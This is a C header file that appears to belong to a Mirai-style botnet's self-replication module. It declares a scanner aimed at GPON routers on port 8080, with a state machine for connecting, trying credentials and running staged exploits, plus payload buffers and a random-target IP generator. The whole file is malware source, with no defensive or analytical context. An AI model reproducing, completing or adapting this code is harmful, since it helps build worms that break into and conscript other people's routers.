#ifdef SELFREP

#pragma once

#include <stdint.h>

#include "includes.h"

#ifdef DEBUG
#define gpon80802_SCANNER_MAX_CONNS   3
#define gpon80802_SCANNER_RAW_PPS     788
#else
#define gpon80802_SCANNER_MAX_CONNS   256
#define gpon80802_SCANNER_RAW_PPS     788
#endif

#define gpon80802_SCANNER_RDBUF_SIZE  1080
#define gpon80802_SCANNER_HACK_DRAIN  64

struct gpon80802_scanner_connection
{
    int fd, last_recv;
    enum
    {
        gpon80802_SC_CLOSED,
        gpon80802_SC_CONNECTING,
        gpon80802_SC_GET_CREDENTIALS,
        gpon80802_SC_EXPLOIT_STAGE2,
        gpon80802_SC_EXPLOIT_STAGE3,
    } state;
    ipv4_t dst_addr;
    uint16_t dst_port;
    int rdbuf_pos;
    char rdbuf[gpon80802_SCANNER_RDBUF_SIZE];
    char **credentials;
    char payload_buf[5000], payload_buf2[5000];
    int credential_index;
};

void gpon80802_scanner();
void gpon80802_kill(void);

static void gpon80802_setup_connection(struct gpon80802_scanner_connection *);
static ipv4_t get_random_gpon80802_ip(void);

#endif
